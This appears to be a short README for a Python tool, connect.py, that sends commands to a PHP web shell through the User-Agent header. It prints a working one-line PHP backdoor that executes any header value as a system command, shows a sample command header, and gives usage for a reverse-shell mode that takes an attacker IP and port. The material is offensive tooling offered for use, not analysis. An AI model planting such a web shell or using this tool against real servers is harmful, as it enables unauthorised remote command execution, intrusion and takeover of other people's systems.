this tool was created for automate process of make connections to  webshell by header

for example, when there is a page webshell.php with this code bellow
'''
<?php system($_SERVER['HTTP_USER_AGENT'])?>
'''
the Header '''User-Agent''' is accepting code execution in the server 

and you can execute commands as in the the example:
'''
User-Agent: ls
'''

<h1>How to use</h1>

default connection:

python3 connect.py [webpage] [Argument]

Reverse Shell connection:

python3 connect.py [webpage] [Argument] [reverse_shell_ip] [reverse_shell_port]

